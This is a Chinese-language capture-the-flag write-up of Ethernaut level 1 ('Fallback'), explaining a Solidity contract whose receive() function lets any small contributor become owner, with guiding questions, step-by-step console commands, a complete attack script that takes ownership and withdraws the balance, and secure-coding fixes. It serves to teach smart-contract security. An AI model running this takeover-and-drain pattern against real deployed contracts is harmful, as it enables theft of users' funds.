一段简单的代码：
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

## 代码结构解析(用 Go/C 的思维理解)

### 1. **基本概念类比**
```solidity
contract Fallback {
```
- `contract` 就像 Go 的 `struct` + 方法,或 C 的结构体 + 函数指针
- 这是一个部署在区块链上的"程序",有自己的存储空间和余额

### 2. **状态变量(类似全局变量)**
```solidity
mapping(address => uint256) public contributions;
address public owner;
```
- `mapping` 类似 Go 的 `map[string]uint64`,键是地址,值是贡献金额
- `address` 是以太坊账户地址(类似指针,20字节)
- `owner` 存储当前合约拥有者的地址

### 3. **构造函数**
```solidity
constructor() {
    owner = msg.sender;  // msg.sender = 调用者地址(类似函数参数)
    contributions[msg.sender] = 1000 * (1 ether);
}
```
- 部署时执行一次,设置部署者为 owner
- 给 owner 初始贡献值 1000 ETH

### 4. **修饰器(类似装饰器/中间件)**
```solidity
modifier onlyOwner() {
    require(msg.sender == owner, "caller is not the owner");
    _;
}
```
- 类似 Go 的中间件,在函数执行前检查条件
- `require` = `if (!condition) { panic("error") }`
- `_;` 表示"继续执行被修饰的函数"

### 5. **关键函数分析**

#### **contribute() - 贡献函数**
```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);  // 每次必须小于 0.001 ETH
    contributions[msg.sender] += msg.value;
    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;  // 如果你的贡献超过 owner,你成为新 owner
    }
}
```
- `payable` 表示可以接收以太币(钱)
- `msg.value` = 这次调用发送的金额

#### **withdraw() - 提款函数**
```solidity
function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
}
```
- 只有 owner 能调用(因为 `onlyOwner` 修饰器)
- 把合约的所有余额转给 owner

#### **receive() - 匿名接收函数** ⚠️
```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;  // 直接修改 owner!
}
```
- 当合约直接收到转账(不调用任何函数)时触发
- 类似 Go 的默认 case 或 C 的 default 分支

---

## 🤔 思考题(引导你发现漏洞)

现在你理解代码了,思考这些问题:

**问题 1**: 正常情况下,要成为 owner 有什么条件?需要多少钱?

**问题 2**: 注意 `receive()` 函数,它成为 owner 的条件和 `contribute()` 有什么不同?

**问题 3**: 如果你想用最少的钱成为 owner,你会选择哪条路径?


解决思路：
太棒了!你成功完成了攻击! 🎉 让我帮你整理一份适合放到博客的 Markdown 文档。

---


# Ethernaut 第 1 关: Fallback - 题解

## 关卡目标
1. 获得合约的所有权 (成为 owner)
2. 将合约余额降为 0

## 合约代码分析

### 核心漏洞
合约存在两条成为 owner 的路径:

**路径 1: 通过 `contribute()` 函数**
```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;  // 需要贡献超过 1000 ETH
    }
}
```
- 每次只能转 < 0.001 ETH
- 需要总贡献 > 1000 ETH 才能成为 owner
- **成本: > 1000 ETH (不现实)**

**路径 2: 通过 `receive()` 函数** ⚠️ 漏洞
```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;  // 直接修改 owner!
}
```
- 只需要 `contributions[msg.sender] > 0` (任意小额即可)
- 通过匿名转账触发
- **成本: 0.0002 ETH (相差 500 万倍!)**

### 什么是 `receive()` 函数?
- Solidity 的特殊函数,当合约收到**纯转账**(没有调用任何函数)时自动触发
- 相当于"默认处理器"
- 区别:
  - `contract.contribute({value: 0.1})` → 调用 contribute 函数
  - `contract.sendTransaction({value: 0.1})` → 触发 receive 函数

## 攻击步骤

### 步骤 1: 查看初始状态
```javascript
await contract.owner()
// "0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB"

player
// "0xB9cf7960efEdDF5569C25853A4F428e6A8cED294"

(await contract.getContribution()).toString()
// "0"
```

### 步骤 2: 建立贡献记录
调用 `contribute()` 函数,让 `contributions[player] > 0`:
```javascript
await contract.contribute({value: toWei("0.0001")})
// Object { tx: "0x47798ba...", receipt: {...}, logs: [] }

(await contract.getContribution()).toString()
// "100000000000000" (0.0001 ETH 的 Wei 单位)
```

### 步骤 3: 匿名转账触发 receive()
直接给合约转账,不调用任何函数:
```javascript
await contract.sendTransaction({value: toWei("0.0001")})
// Object { tx: "0x3e4312c...", receipt: {...}, logs: [] }
```
**关键:** 这个操作会触发 `receive()` 函数,直接把你设为 owner!

### 步骤 4: 验证所有权
```javascript
await contract.owner()
// "0xB9cf7960efEdDF5569C25853A4F428e6A8cED294" (你的地址!)
```

### 步骤 5: 提走所有资金
```javascript
await getBalance(contract.address)
// "0.0002" (合约当前余额)

await contract.withdraw()
// Object { tx: "0x2b7142c...", receipt: {...}, logs: [] }

await getBalance(contract.address)
// "0" (余额归零)
```

## 完整攻击脚本
```javascript
// 1. 建立贡献记录
await contract.contribute({value: toWei("0.0001")});

// 2. 匿名转账触发 receive()
await contract.sendTransaction({value: toWei("0.0001")});

// 3. 验证成为 owner
console.log("新 owner:", await contract.owner());
console.log("是你吗?", (await contract.owner()) === player);

// 4. 提走所有资金
await contract.withdraw();
console.log("✅ 攻击完成!");
```

## 漏洞本质

### 访问控制缺陷
- `receive()` 提供了一条绕过正常逻辑的"后门"
- 修改 `owner` 这种关键操作不应该有多条路径
- 开发者可能以为只有 `contribute()` 能改变权限,忽略了 `receive()`

### EVM 机制利用
当你发送没有 `data` 字段的交易时:
```
交易到达合约
    ↓
EVM: "msg.data 为空,这是纯转账"
    ↓
查找 receive() 函数
    ↓
执行 receive() → owner 被修改
```

## 安全建议

### ❌ 危险的写法
```solidity
receive() external payable {
    owner = msg.sender;  // 不应该在这里修改权限!
}
```

### ✅ 安全的写法
```solidity
receive() external payable {
    // 只做简单的记录,不修改关键状态
    contributions[msg.sender] += msg.value;
    emit Received(msg.sender, msg.value);
}

// 权限修改应该有明确的函数和严格的检查
function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    owner = newOwner;
}
```

## 关键教训
1. **特殊函数要特别小心**: `receive()`, `fallback()`, `constructor()` 等特殊函数容易被忽略
2. **最小权限原则**: 不要在"辅助函数"中修改关键状态
3. **代码审计清单**:
   - ✅ 检查所有能修改 owner 的代码路径
   - ✅ 特别关注 receive/fallback 函数
   - ✅ 确保访问控制逻辑没有遗漏

## 总结
这一关的核心是理解 Solidity 的 `receive()` 函数机制。开发者本意可能是让这个函数"接收捐款",但不小心在里面加了修改 owner 的逻辑,形成了一个巨大的安全漏洞。

**成本对比:**
- 正常路径: > 1000 ETH
- 漏洞路径: 0.0002 ETH
- **差距: 500 万倍!**

---

## 相关资源
- [Solidity 官方文档 - Receive 函数](https://docs.soliditylang.org/en/latest/contracts.html#receive-ether-function)
- [Ethernaut 关卡列表](https://ethernaut.openzeppelin.com/)


---
